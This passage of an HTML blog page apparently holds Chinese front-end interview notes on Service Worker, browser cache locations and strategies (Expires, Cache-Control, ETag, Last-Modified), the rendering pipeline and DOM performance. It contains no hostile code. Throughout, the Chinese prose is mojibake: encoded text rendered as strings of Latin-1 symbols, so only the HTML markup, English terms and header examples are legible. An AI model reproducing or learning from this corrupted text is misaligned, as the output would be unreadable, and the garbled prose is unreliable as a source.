cookieï¼Œä¹Ÿä¸ä¼šè¢«è‡ªåŠ¨æ·»åŠ åˆ°è¯·æ±‚å¤´éƒ¨ï¼Œé™¤éæ˜¾ç¤ºåœ°è§„å®šã€‚</p><h1 id="ä»€ä¹ˆæ˜¯-Service-Workerï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Service-Workerï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Service Workerï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Service Workerï¼Ÿ</h1><p>Service Worker æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨èƒŒåçš„<strong>ç‹¬ç«‹çº¿ç¨‹</strong>ï¼Œä¸€èˆ¬å¯ä»¥ç”¨æ¥å®ç°ç¼“å­˜åŠŸèƒ½ã€‚ä½¿ç”¨ Service Workerçš„è¯ï¼Œä¼ è¾“åè®®å¿…é¡»ä¸º <strong>HTTPS</strong>ã€‚å› ä¸º Service Worker ä¸­æ¶‰åŠåˆ°è¯·æ±‚æ‹¦æˆªï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨ HTTPS åè®®æ¥ä¿éšœå®‰å…¨ã€‚</p><p>Service Worker å®ç°ç¼“å­˜åŠŸèƒ½ä¸€èˆ¬åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼šé¦–å…ˆéœ€è¦å…ˆæ³¨å†Œ Service Workerï¼Œç„¶åç›‘å¬åˆ° <code>install</code> äº‹ä»¶ä»¥åå°±å¯ä»¥ç¼“å­˜éœ€è¦çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡ç”¨æˆ·è®¿é—®çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡æ‹¦æˆªè¯·æ±‚çš„æ–¹å¼æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ç¼“å­˜ï¼Œå­˜åœ¨ç¼“å­˜çš„è¯å°±å¯ä»¥ç›´æ¥è¯»å–ç¼“å­˜æ–‡ä»¶ï¼Œå¦åˆ™å°±å»è¯·æ±‚æ•°æ®ã€‚</p><h1 id="æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶ï¼Ÿ"><a href="#æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶ï¼Ÿ" class="headerlink" title="æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶ï¼Ÿ"></a>æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶ï¼Ÿ</h1><p>æµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶æŒ‡çš„æ˜¯é€šè¿‡åœ¨ä¸€æ®µæ—¶é—´å†…ä¿ç•™å·²æ¥æ”¶åˆ°çš„ web èµ„æºçš„ä¸€ä¸ªå‰¯æœ¬ï¼Œå¦‚æœåœ¨èµ„æºçš„æœ‰æ•ˆæ—¶é—´å†…ï¼Œå‘èµ·äº†å¯¹è¿™ä¸ªèµ„æºçš„å†ä¸€æ¬¡è¯·æ±‚ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šç›´æ¥ä½¿ç”¨ç¼“å­˜çš„å‰¯æœ¬ï¼Œè€Œä¸æ˜¯å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚å¯¹äºä¸€ä¸ªæ•°æ®è¯·æ±‚æ¥è¯´ï¼Œå¯ä»¥åˆ†ä¸ºå‘èµ·ç½‘ç»œè¯·æ±‚ã€åç«¯å¤„ç†ã€æµè§ˆå™¨å“åº”ä¸‰ä¸ªæ­¥éª¤ã€‚æµè§ˆå™¨ç¼“å­˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ç¬¬ä¸€å’Œç¬¬ä¸‰æ­¥éª¤ä¸­ä¼˜åŒ–æ€§èƒ½ã€‚æœ¬é—®é¢˜å‚è€ƒè‡ª <a href="https://juejin.cn/book/6844733763675488269/section/6844733763771990029">å‰ç«¯é¢è¯•ä¹‹é“</a>ã€‚</p><h2 id="ç¼“å­˜ä½ç½®"><a href="#ç¼“å­˜ä½ç½®" class="headerlink" title="ç¼“å­˜ä½ç½®"></a>ç¼“å­˜ä½ç½®</h2><p>ä»ç¼“å­˜ä½ç½®ä¸Šæ¥è¯´åˆ†ä¸ºå››ç§ï¼Œå¹¶ä¸”å„è‡ªæœ‰<strong>ä¼˜å…ˆçº§</strong>ï¼Œå½“ä¾æ¬¡æŸ¥æ‰¾ç¼“å­˜ä¸”éƒ½æ²¡æœ‰å‘½ä¸­çš„æ—¶å€™ï¼Œæ‰ä¼šå»è¯·æ±‚ç½‘ç»œ</p><ol><li>Service Worker</li><li>Memory Cache</li><li>Disk Cache</li><li>Push Cache</li><li>ç½‘ç»œè¯·æ±‚</li></ol><h3 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h3><p>Service Worker çš„ç¼“å­˜ä¸æµè§ˆå™¨å…¶ä»–å†…å»ºçš„ç¼“å­˜æœºåˆ¶ä¸åŒï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬<strong>è‡ªç”±æ§åˆ¶</strong>ç¼“å­˜å“ªäº›æ–‡ä»¶ã€å¦‚ä½•åŒ¹é…ç¼“å­˜ã€å¦‚ä½•è¯»å–ç¼“å­˜ï¼Œå¹¶ä¸”<strong>ç¼“å­˜æ˜¯æŒç»­æ€§çš„</strong>ã€‚</p><p>å½“ Service Worker æ²¡æœ‰å‘½ä¸­ç¼“å­˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å»è°ƒç”¨ <code>fetch</code> å‡½æ•°è·å–æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰åœ¨ Service Worker å‘½ä¸­ç¼“å­˜çš„è¯ï¼Œä¼šæ ¹æ®ç¼“å­˜æŸ¥æ‰¾ä¼˜å…ˆçº§å»æŸ¥æ‰¾æ•°æ®ã€‚ä½†æ˜¯ä¸ç®¡æˆ‘ä»¬æ˜¯ä» Memory Cache ä¸­è¿˜æ˜¯ä»ç½‘ç»œè¯·æ±‚ä¸­è·å–çš„æ•°æ®ï¼Œæµè§ˆå™¨éƒ½ä¼šæ˜¾ç¤ºæˆ‘ä»¬æ˜¯<strong>ä» Service Worker ä¸­è·å–çš„å†…å®¹</strong>ã€‚</p><h3 id="Memory-Cache"><a href="#Memory-Cache" class="headerlink" title="Memory Cache"></a>Memory Cache</h3><p>Memory Cache ä¹Ÿå°±æ˜¯å†…å­˜ä¸­çš„ç¼“å­˜ï¼Œè¯»å–å†…å­˜ä¸­çš„æ•°æ®è‚¯å®šæ¯”ç£ç›˜å¿«ã€‚<strong>ä½†æ˜¯å†…å­˜ç¼“å­˜è™½ç„¶è¯»å–é«˜æ•ˆï¼Œå¯æ˜¯ç¼“å­˜æŒç»­æ€§å¾ˆçŸ­ï¼Œä¼šéšç€è¿›ç¨‹çš„é‡Šæ”¾è€Œé‡Šæ”¾ã€‚</strong> ä¸€æ—¦æˆ‘ä»¬å…³é—­ Tab é¡µé¢ï¼Œå†…å­˜ä¸­çš„ç¼“å­˜ä¹Ÿå°±è¢«é‡Šæ”¾äº†ã€‚</p><h3 id="Disk-Cache"><a href="#Disk-Cache" class="headerlink" title="Disk Cache"></a>Disk Cache</h3><p>Disk Cache ä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­çš„ç¼“å­˜ï¼Œè¯»å–é€Ÿåº¦æ…¢ç‚¹ï¼Œä½†æ˜¯ä»€ä¹ˆéƒ½èƒ½å­˜å‚¨åˆ°ç£ç›˜ä¸­ï¼Œæ¯”ä¹‹ Memory Cache <strong>èƒœåœ¨å®¹é‡å’Œå­˜å‚¨æ—¶æ•ˆæ€§ä¸Šã€‚</strong></p><p>åœ¨æ‰€æœ‰æµè§ˆå™¨ç¼“å­˜ä¸­ï¼ŒDisk Cache è¦†ç›–é¢åŸºæœ¬æ˜¯æœ€å¤§çš„ã€‚å®ƒä¼šæ ¹æ® HTTP Herder ä¸­çš„å­—æ®µåˆ¤æ–­å“ªäº›èµ„æºéœ€è¦ç¼“å­˜ï¼Œå“ªäº›èµ„æºå¯ä»¥ä¸è¯·æ±‚ç›´æ¥ä½¿ç”¨ï¼Œå“ªäº›èµ„æºå·²ç»è¿‡æœŸéœ€è¦é‡æ–°è¯·æ±‚ã€‚<strong>å¹¶ä¸”å³ä½¿åœ¨è·¨ç«™ç‚¹çš„æƒ…å†µä¸‹ï¼Œç›¸åŒåœ°å€çš„èµ„æºä¸€æ—¦è¢«ç¡¬ç›˜ç¼“å­˜ä¸‹æ¥ï¼Œå°±ä¸ä¼šå†æ¬¡å»è¯·æ±‚æ•°æ®ã€‚</strong></p><h3 id="Push-Cache"><a href="#Push-Cache" class="headerlink" title="Push Cache"></a>Push Cache</h3><p>Push Cache æ˜¯ HTTP/2 ä¸­çš„å†…å®¹ï¼Œå½“ä»¥ä¸Šä¸‰ç§ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­æ—¶ï¼Œå®ƒæ‰ä¼šè¢«ä½¿ç”¨ã€‚<strong>å¹¶ä¸”ç¼“å­˜æ—¶é—´ä¹Ÿå¾ˆçŸ­æš‚ï¼Œåªåœ¨ä¼šè¯ï¼ˆSessionï¼‰ä¸­å­˜åœ¨ï¼Œä¸€æ—¦ä¼šè¯ç»“æŸå°±è¢«é‡Šæ”¾ã€‚</strong></p><h3 id="ç½‘ç»œè¯·æ±‚"><a href="#ç½‘ç»œè¯·æ±‚" class="headerlink" title="ç½‘ç»œè¯·æ±‚"></a>ç½‘ç»œè¯·æ±‚</h3><p>å¦‚æœæ‰€æœ‰ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­çš„è¯ï¼Œé‚£ä¹ˆåªèƒ½å‘èµ·è¯·æ±‚æ¥è·å–èµ„æºäº†ã€‚</p><h2 id="ç¼“å­˜ç­–ç•¥"><a href="#ç¼“å­˜ç­–ç•¥" class="headerlink" title="ç¼“å­˜ç­–ç•¥"></a>ç¼“å­˜ç­–ç•¥</h2><p>é€šå¸¸æµè§ˆå™¨ç¼“å­˜ç­–ç•¥åˆ†ä¸ºä¸¤ç§ï¼š<strong>å¼ºç¼“å­˜</strong>å’Œ<strong>åå•†ç¼“å­˜</strong>ï¼Œå¹¶ä¸”ç¼“å­˜ç­–ç•¥éƒ½æ˜¯é€šè¿‡è®¾ç½® HTTP Header æ¥å®ç°çš„ã€‚</p><h3 id="å¼ºç¼“å­˜"><a href="#å¼ºç¼“å­˜" class="headerlink" title="å¼ºç¼“å­˜"></a>å¼ºç¼“å­˜</h3><p>å¼ºç¼“å­˜å¯ä»¥é€šè¿‡è®¾ç½®ä¸¤ç§ HTTP Header å®ç°ï¼š<code>Expires</code> å’Œ <code>Cache-Control</code> ã€‚å¼ºç¼“å­˜è¡¨ç¤ºåœ¨ç¼“å­˜æœŸé—´ä¸éœ€è¦è¯·æ±‚ï¼Œ<code>state code</code> ä¸º 200ã€‚</p><h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Wed, 22 Oct 2018 08:41:00 GMT</span><br></pre></td></tr></table></figure><p><code>Expires</code> æ˜¯ HTTP/1 çš„äº§ç‰©ï¼Œè¡¨ç¤ºèµ„æºä¼šåœ¨ <code>Wed, 22 Oct 2018 08:41:00 GMT</code> åè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚å¹¶ä¸” <code>Expires</code> <strong>å—é™äºæœ¬åœ°æ—¶é—´</strong>ï¼Œå¦‚æœä¿®æ”¹äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½ä¼šé€ æˆç¼“å­˜å¤±æ•ˆã€‚</p><h4 id="Cache-control"><a href="#Cache-control" class="headerlink" title="Cache-control"></a>Cache-control</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cache-control</span><span class="punctuation">: </span>max-age=30</span><br></pre></td></tr></table></figure><p><code>Cache-Control</code> å‡ºç°äº HTTP/1.1ï¼Œ<strong>ä¼˜å…ˆçº§é«˜äº <code>Expires</code></strong> ã€‚è¯¥å±æ€§å€¼è¡¨ç¤ºèµ„æºä¼šåœ¨ 30 ç§’åè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚</p><p><code>Cache-Control</code> <strong>å¯ä»¥åœ¨è¯·æ±‚å¤´æˆ–è€…å“åº”å¤´ä¸­è®¾ç½®</strong>ï¼Œå¹¶ä¸”å¯ä»¥ç»„åˆä½¿ç”¨å¤šç§æŒ‡ä»¤</p><p><img src="https://i.loli.net/2021/09/11/b8Dz94rL5aeByWK.png" alt="image.png"></p><h3 id="åå•†ç¼“å­˜"><a href="#åå•†ç¼“å­˜" class="headerlink" title="åå•†ç¼“å­˜"></a>åå•†ç¼“å­˜</h3><p>å¦‚æœç¼“å­˜è¿‡æœŸäº†ï¼Œå°±éœ€è¦å‘èµ·è¯·æ±‚éªŒè¯èµ„æºæ˜¯å¦æœ‰æ›´æ–°ã€‚åå•†ç¼“å­˜å¯ä»¥é€šè¿‡è®¾ç½®ä¸¤ç§ HTTP Header å®ç°ï¼š<code>Last-Modified</code> å’Œ <code>ETag</code> ã€‚</p><p>å½“æµè§ˆå™¨å‘èµ·è¯·æ±‚éªŒè¯èµ„æºæ—¶ï¼Œå¦‚æœèµ„æºæ²¡æœ‰åšæ”¹å˜ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°±ä¼šè¿”å› 304 çŠ¶æ€ç ï¼Œå¹¶ä¸”æ›´æ–°æµè§ˆå™¨ç¼“å­˜æœ‰æ•ˆæœŸã€‚</p><h4 id="Last-Modified-å’Œ-If-Modified-Since"><a href="#Last-Modified-å’Œ-If-Modified-Since" class="headerlink" title="Last-Modified å’Œ If-Modified-Since"></a>Last-Modified å’Œ If-Modified-Since</h4><p><code>Last-Modified</code> è¡¨ç¤ºæœ¬åœ°æ–‡ä»¶æœ€åä¿®æ”¹æ—¥æœŸï¼Œ<code>If-Modified-Since</code> ä¼šå°† <code>Last-Modified</code> çš„å€¼å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®æœåŠ¡å™¨åœ¨è¯¥æ—¥æœŸåèµ„æºæ˜¯å¦æœ‰æ›´æ–°ï¼Œæœ‰æ›´æ–°çš„è¯å°±ä¼šå°†æ–°çš„èµ„æºå‘é€å›æ¥ï¼Œå¦åˆ™è¿”å› 304 çŠ¶æ€ç ã€‚</p><p>ä½†æ˜¯ <code>Last-Modified</code> å­˜åœ¨ä¸€äº›å¼Šç«¯ï¼š</p><ul><li>å¦‚æœæœ¬åœ°æ‰“å¼€ç¼“å­˜æ–‡ä»¶ï¼Œå³ä½¿æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œä½†è¿˜æ˜¯ä¼šé€ æˆ <code>Last-Modified</code> è¢«ä¿®æ”¹ï¼ŒæœåŠ¡ç«¯ä¸èƒ½å‘½ä¸­ç¼“å­˜å¯¼è‡´å‘é€ç›¸åŒçš„èµ„æº</li><li>å› ä¸º <code>Last-Modified</code> åªèƒ½ä»¥ç§’è®¡æ—¶ï¼Œå¦‚æœåœ¨ä¸å¯æ„ŸçŸ¥çš„æ—¶é—´å†…ä¿®æ”¹å®Œæˆæ–‡ä»¶ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯ä¼šè®¤ä¸ºèµ„æºè¿˜æ˜¯å‘½ä¸­äº†ï¼Œä¸ä¼šè¿”å›æ­£ç¡®çš„èµ„æº</li></ul><p>å› ä¸ºä»¥ä¸Šè¿™äº›å¼Šç«¯ï¼Œæ‰€ä»¥åœ¨ HTTP / 1.1 å‡ºç°äº† <code>ETag</code> ã€‚</p><h4 id="ETag-å’Œ-If-None-Match"><a href="#ETag-å’Œ-If-None-Match" class="headerlink" title="ETag å’Œ If-None-Match"></a>ETag å’Œ If-None-Match</h4><p><code>ETag</code> ç±»ä¼¼äºæ–‡ä»¶æŒ‡çº¹ï¼Œ<code>If-None-Match</code> ä¼šå°†å½“å‰ <code>ETag</code> å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®è¯¥èµ„æº <code>ETag</code> æ˜¯å¦å˜åŠ¨ï¼Œæœ‰å˜åŠ¨çš„è¯å°±å°†æ–°çš„èµ„æºå‘é€å›æ¥ã€‚å¹¶ä¸” <code>ETag</code> ä¼˜å…ˆçº§æ¯” <code>Last-Modified</code> é«˜ã€‚</p><p><strong>å¦‚æœä»€ä¹ˆç¼“å­˜ç­–ç•¥éƒ½æ²¡è®¾ç½®ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šæ€ä¹ˆå¤„ç†ï¼Ÿ</strong></p><p>å¯¹äºè¿™ç§æƒ…å†µï¼Œæµè§ˆå™¨ä¼šé‡‡ç”¨ä¸€ä¸ªå¯å‘å¼çš„ç®—æ³•ï¼Œé€šå¸¸ä¼šå–å“åº”å¤´ä¸­çš„ <code>Date</code> å‡å» <code>Last-Modified</code> å€¼çš„ 10% ä½œä¸ºç¼“å­˜æ—¶é—´ã€‚</p><h2 id="å®é™…åœºæ™¯åº”ç”¨ç¼“å­˜ç­–ç•¥"><a href="#å®é™…åœºæ™¯åº”ç”¨ç¼“å­˜ç­–ç•¥" class="headerlink" title="å®é™…åœºæ™¯åº”ç”¨ç¼“å­˜ç­–ç•¥"></a>å®é™…åœºæ™¯åº”ç”¨ç¼“å­˜ç­–ç•¥</h2><h3 id="é¢‘ç¹å˜åŠ¨çš„èµ„æº"><a href="#é¢‘ç¹å˜åŠ¨çš„èµ„æº" class="headerlink" title="é¢‘ç¹å˜åŠ¨çš„èµ„æº"></a>é¢‘ç¹å˜åŠ¨çš„èµ„æº</h3><p>å¯¹äºé¢‘ç¹å˜åŠ¨çš„èµ„æºï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ <code>Cache-Control: no-cache</code> ä½¿æµè§ˆå™¨æ¯æ¬¡éƒ½è¯·æ±‚æœåŠ¡å™¨ï¼Œç„¶åé…åˆ <code>ETag</code> æˆ–è€… <code>Last-Modified</code> æ¥éªŒè¯èµ„æºæ˜¯å¦æœ‰æ•ˆã€‚è¿™æ ·çš„åšæ³•è™½ç„¶ä¸èƒ½èŠ‚çœè¯·æ±‚æ•°é‡ï¼Œä½†æ˜¯èƒ½æ˜¾è‘—å‡å°‘å“åº”æ•°æ®å¤§å°ã€‚</p><h3 id="ä»£ç æ–‡ä»¶"><a href="#ä»£ç æ–‡ä»¶" class="headerlink" title="ä»£ç æ–‡ä»¶"></a>ä»£ç æ–‡ä»¶</h3><p>è¿™é‡Œç‰¹æŒ‡é™¤äº† HTML å¤–çš„ä»£ç æ–‡ä»¶ï¼Œå› ä¸º HTML æ–‡ä»¶ä¸€èˆ¬ä¸ç¼“å­˜æˆ–è€…ç¼“å­˜æ—¶é—´å¾ˆçŸ­ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œç°åœ¨éƒ½ä¼šä½¿ç”¨å·¥å…·æ¥æ‰“åŒ…ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œåªæœ‰å½“ä»£ç ä¿®æ”¹åæ‰ä¼šç”Ÿæˆæ–°çš„æ–‡ä»¶åã€‚åŸºäºæ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™ä»£ç æ–‡ä»¶è®¾ç½®ç¼“å­˜æœ‰æ•ˆæœŸä¸€å¹´ <code>Cache-Control: max-age=31536000</code>ï¼Œè¿™æ ·åªæœ‰å½“ HTML æ–‡ä»¶ä¸­å¼•å…¥çš„æ–‡ä»¶åå‘ç”Ÿäº†æ”¹å˜æ‰ä¼šå»ä¸‹è½½æœ€æ–°çš„ä»£ç æ–‡ä»¶ï¼Œå¦åˆ™å°±ä¸€ç›´ä½¿ç”¨ç¼“å­˜ã€‚</p><h1 id="æµè§ˆå™¨æ¸²æŸ“åŸç†ï¼Ÿ"><a href="#æµè§ˆå™¨æ¸²æŸ“åŸç†ï¼Ÿ" class="headerlink" title="æµè§ˆå™¨æ¸²æŸ“åŸç†ï¼Ÿ"></a>æµè§ˆå™¨æ¸²æŸ“åŸç†ï¼Ÿ</h1><p>å‚è€ƒè‡ª <a href="https://juejin.cn/book/6844733763675488269/section/6844733763771957256">å‰ç«¯é¢è¯•ä¹‹é“</a></p><h2 id="ä¸€ã€æµè§ˆå™¨æ¥æ”¶åˆ°-HTML-æ–‡ä»¶å¹¶è½¬æ¢ä¸º-DOM-æ ‘"><a href="#ä¸€ã€æµè§ˆå™¨æ¥æ”¶åˆ°-HTML-æ–‡ä»¶å¹¶è½¬æ¢ä¸º-DOM-æ ‘" class="headerlink" title="ä¸€ã€æµè§ˆå™¨æ¥æ”¶åˆ° HTML æ–‡ä»¶å¹¶è½¬æ¢ä¸º DOM æ ‘"></a>ä¸€ã€æµè§ˆå™¨æ¥æ”¶åˆ° HTML æ–‡ä»¶å¹¶è½¬æ¢ä¸º DOM æ ‘</h2><p>å½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªç½‘é¡µæ—¶ï¼Œæµè§ˆå™¨éƒ½ä¼šå»è¯·æ±‚å¯¹åº”çš„ HTML æ–‡ä»¶ã€‚å½“æµè§ˆå™¨æ¥æ”¶åˆ°è¿™äº›å­—èŠ‚æ•°æ®ä»¥åï¼Œå®ƒä¼šå°†è¿™äº›<strong>å­—èŠ‚æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å†™çš„ä»£ç ã€‚</p><p>å½“æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²ä»¥åï¼Œæµè§ˆå™¨ä¼šå…ˆå°†è¿™äº›å­—ç¬¦ä¸²é€šè¿‡è¯æ³•åˆ†æè½¬æ¢ä¸º<strong>æ ‡è®°</strong>ï¼ˆtokenï¼‰ï¼Œè¿™ä¸€è¿‡ç¨‹åœ¨è¯æ³•åˆ†æä¸­å«åš<strong>æ ‡è®°åŒ–</strong>ï¼ˆtokenizationï¼‰ã€‚</p><p>å½“ç»“æŸæ ‡è®°åŒ–åï¼Œè¿™äº›æ ‡è®°ä¼šç´§æ¥ç€è½¬æ¢ä¸º Nodeï¼Œæœ€åè¿™äº› Node ä¼šæ ¹æ®ä¸åŒ Node ä¹‹å‰çš„è”ç³»æ„å»ºä¸ºä¸€é¢— DOM æ ‘ã€‚</p><p><img src="https://i.loli.net/2021/09/11/9l5tgzC67v8XdIV.png" alt="image.png"></p><h2 id="äºŒã€å°†-CSS-æ–‡ä»¶è½¬æ¢ä¸º-CSSOM-æ ‘"><a href="#äºŒã€å°†-CSS-æ–‡ä»¶è½¬æ¢ä¸º-CSSOM-æ ‘" class="headerlink" title="äºŒã€å°† CSS æ–‡ä»¶è½¬æ¢ä¸º CSSOM æ ‘"></a>äºŒã€å°† CSS æ–‡ä»¶è½¬æ¢ä¸º CSSOM æ ‘</h2><p>åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨ä¼šç¡®å®šä¸‹æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„<strong>æ ·å¼</strong>åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”è¿™ä¸€è¿‡ç¨‹å…¶å®æ˜¯<strong>å¾ˆæ¶ˆè€—èµ„æº</strong>çš„ã€‚å› ä¸ºæ ·å¼å¯ä»¥è‡ªè¡Œè®¾ç½®ç»™æŸä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç»§æ‰¿è·å¾—ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¾—<strong>é€’å½’</strong> CSSOM æ ‘ï¼Œç„¶åç¡®å®šå…·ä½“çš„å…ƒç´ åˆ°åº•æ˜¯ä»€ä¹ˆæ ·å¼ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°½å¯èƒ½çš„é¿å…å†™<strong>è¿‡äºå…·ä½“</strong>çš„ CSS é€‰æ‹©å™¨ï¼ˆä¾‹å¦‚ <code>div &gt; a &gt; span</code>ï¼‰ï¼Œç„¶åå¯¹äº HTML æ¥è¯´ä¹Ÿå°½é‡å°‘çš„æ·»åŠ æ— æ„ä¹‰æ ‡ç­¾ï¼Œä¿è¯<strong>å±‚çº§æ‰å¹³</strong>ã€‚</p><h2 id="ä¸‰ã€ç”Ÿæˆæ¸²æŸ“æ ‘"><a href="#ä¸‰ã€ç”Ÿæˆæ¸²æŸ“æ ‘" class="headerlink" title="ä¸‰ã€ç”Ÿæˆæ¸²æŸ“æ ‘"></a>ä¸‰ã€ç”Ÿæˆæ¸²æŸ“æ ‘</h2><p>å½“ç”Ÿæˆ DOM æ ‘å’Œ CSSOM æ ‘ä»¥åï¼Œå°±éœ€è¦å°†è¿™ä¸¤æ£µæ ‘ç»„åˆä¸ºæ¸²æŸ“æ ‘ã€‚</p><p><img src="https://i.loli.net/2021/09/11/SkfPoQpEnyXaA3V.png" alt="image.png"></p><p>åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œä¸æ˜¯ç®€å•çš„å°†ä¸¤è€…åˆå¹¶ã€‚æ¸²æŸ“æ ‘åªä¼šåŒ…æ‹¬<strong>éœ€è¦æ˜¾ç¤ºçš„èŠ‚ç‚¹</strong>å’Œè¿™äº›èŠ‚ç‚¹çš„æ ·å¼ä¿¡æ¯ï¼Œå¦‚æœæŸä¸ªèŠ‚ç‚¹æ˜¯ <code>display: none</code> çš„ï¼Œé‚£ä¹ˆå°±ä¸ä¼šåœ¨æ¸²æŸ“æ ‘ä¸­æ˜¾ç¤ºã€‚</p><p>å½“æµè§ˆå™¨ç”Ÿæˆæ¸²æŸ“æ ‘ä»¥åï¼Œå°±ä¼šæ ¹æ®æ¸²æŸ“æ ‘æ¥è¿›è¡Œå¸ƒå±€ï¼ˆä¹Ÿå¯ä»¥å«åšå›æµï¼‰ï¼Œç„¶åè°ƒç”¨ GPU ç»˜åˆ¶ï¼Œåˆæˆå›¾å±‚ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p><p><strong>æµ‹é‡æ¸²æŸ“é€Ÿåº¦ï¼š</strong></p><p>å½“å‘ç”Ÿ <code>DOMContentLoaded</code> äº‹ä»¶åï¼Œå°±ä¼šç”Ÿæˆæ¸²æŸ“æ ‘ï¼Œç”Ÿæˆæ¸²æŸ“æ ‘å°±å¯ä»¥è¿›è¡Œæ¸²æŸ“ã€‚</p><h1 id="ä¸ºä»€ä¹ˆæ“ä½œ-DOM-æ…¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ“ä½œ-DOM-æ…¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ“ä½œ DOM æ…¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ“ä½œ DOM æ…¢ï¼Ÿ</h1><p>DOM æ˜¯å±äºæ¸²æŸ“å¼•æ“ä¸­çš„ä¸œè¥¿ï¼Œè€Œ JS åˆæ˜¯ JS å¼•æ“ä¸­çš„ä¸œè¥¿ã€‚å½“æˆ‘ä»¬é€šè¿‡ JS æ“ä½œ DOM çš„æ—¶å€™ï¼Œå…¶å®è¿™ä¸ªæ“ä½œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šå¸¦æ¥ä¸€äº›æ€§èƒ½ä¸Šçš„æŸè€—ã€‚æ“ä½œ DOM æ¬¡æ•°ä¸€å¤šï¼Œä¹Ÿå°±ç­‰åŒäºä¸€ç›´åœ¨è¿›è¡Œçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶ä¸”æ“ä½œ DOM å¯èƒ½è¿˜ä¼šå¸¦æ¥é‡ç»˜å›æµçš„æƒ…å†µï¼Œæ‰€ä»¥ä¹Ÿå°±å¯¼è‡´äº†æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚</p><h2 id="æ’å…¥å‡ ä¸‡ä¸ª-DOMï¼Œå¦‚ä½•å®ç°é¡µé¢ä¸å¡é¡¿ï¼Ÿ"><a href="#æ’å…¥å‡ ä¸‡ä¸ª-DOMï¼Œå¦‚ä½•å®ç°é¡µé¢ä¸å¡é¡¿ï¼Ÿ" class="headerlink" title="æ’å…¥å‡ ä¸‡ä¸ª DOMï¼Œå¦‚ä½•å®ç°é¡µé¢ä¸å¡é¡¿ï¼Ÿ"></a>æ’å…¥å‡ ä¸‡ä¸ª DOMï¼Œå¦‚ä½•å®ç°é¡µé¢ä¸å¡é¡¿ï¼Ÿ</h2><p>åˆ†æ‰¹æ¬¡éƒ¨åˆ†æ¸²æŸ“ DOMï¼š</p><p>1ã€é€šè¿‡ <code>requestAnimationFrame</code> çš„æ–¹å¼å»å¾ªç¯çš„æ’å…¥ DOMã€‚</p><p>2ã€<strong>è™šæ‹Ÿæ»šåŠ¨</strong>ï¼ˆvirtualized 